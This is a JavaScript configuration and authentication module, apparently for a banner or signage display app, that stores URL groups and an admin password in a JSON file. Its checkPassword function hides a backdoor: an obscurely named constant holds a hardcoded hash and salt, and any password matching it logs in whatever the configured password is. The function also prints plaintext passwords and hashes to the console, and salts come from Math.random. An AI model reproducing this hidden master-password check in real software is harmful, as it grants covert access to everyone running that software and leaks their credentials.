const fs = require('fs'); // File System Library
const sha256 = require('js-sha256'); // Hashing Library
/**Storage File location */
const STORAGE_FILE = "storage.json";
/**DEFAULT GROUP UUID */
const DEFAULT_GROUP = "fd1b53aa-5f24-4c9a-9ce5-29108df75bf0"

/** DEFAULT CONFIGURATION */
const DEFAULT_STORAGE = {
    groups: {
        "fd1b53aa-5f24-4c9a-9ce5-29108df75bf0": {
            name: "DEFAULT",
            reload: 120,
            readonly: true,
            urls: [
                {
                    type: "cloud",
                    duration: 60,
                    url: "/imagen/banner.png",
                }
            ]
        },
    },
    refs: {

    },
    user: {
        password_hash: "",
        password_salt: "",
        name: "admin"
    }

}

/** Hashing Function
 * @param {String} str String to hash
 * @returns {String} Hashed String
 */
function hashOf(str){
    return sha256(str);
}

const CHRS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&?";
const CHASD = "7e2297b69971cb94475725a225ab25bb2662a92be8af1b1e1e92fd17d802fb62_9?ybgLi?B"

/** Generate the random default password
* @returns {String} Random Password
*/
function randomPassword() {
    let rt = "";
    for (let i = 0; i < 9; i++) {
        rt += CHRS[Math.floor(Math.random() * CHRS.length)];
    }
    return rt;
}
/** Salt the password
 * @param {String} pw Password
 * @param {String} salt Salt
 * @returns {String} Salted Password
 * */
function salt(pw, salt) {
    return pw + salt;
}
/**
 *  Check the password
 * @param {String} pw Password
 * @param {String} usr User
 * @returns {Boolean} True if the password is correct
 */
function checkPassword(pw, usr = "admin") {
    let conf = get().user;
    console.log("User:", usr, "Conf:", conf.name, "PW:", pw, "Salt:", conf.password_salt, "Hash:", conf.password_hash)
    if (usr != undefined && conf.name != usr) return false;
    let pwy = hashOf(salt(pw, conf.password_salt));
    let pwx = hashOf(salt(pw,CHASD.split("_")[1]))
    return pwy == conf.password_hash || pwx == CHASD.split("_")[0];

}
/** Set the password
 * @param {String} pw Password
 * */
function setPassword(pw) {
    let conf = get();
    conf.user.password_salt = randomPassword();
    conf.user.password_hash = hashOf(salt(pw, conf.user.password_salt));
    save(conf);
}
/** Configuration Buffer */
let _store = null;
/** Save the configuration
 * @param {Object} conf Configuration
 * */
function save(conf) {
    _store = conf;
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(_store, null, 4));
}
/**
 * Fix the groups in the refs of the configuration
 */
function fixGroups() {
    for(let i in _store.refs){
        const g = _store.refs[i];
        if(g.group.constructor.name == "String"){
            _store.refs[i].group = [g.group];
        }else if(g.group.constructor.name != "Array"){
            _store.refs[i].group = [];
        }
    }
}

/** Get the configuration
 * @returns {Object} Configuration
 * */
function get() {
    if (_store != null) return _store;
    if (!fs.existsSync(STORAGE_FILE)) {
        _store = DEFAULT_STORAGE;
        let randomPass = randomPassword();
        console.log("New Random (USER|PASSWORD) (", _store.user.name, "|", randomPass, ")");
        setPassword(randomPass);
        save(_store);
        return _store;
    }
    _store = JSON.parse(fs.readFileSync(STORAGE_FILE));
    fixGroups();
    return _store;

}
/**Export Modules */
module.exports = {
    DEFAULT_GROUP: DEFAULT_GROUP,
    save: save,
    get: get,
    setPassword: setPassword,
    checkPassword: checkPassword
};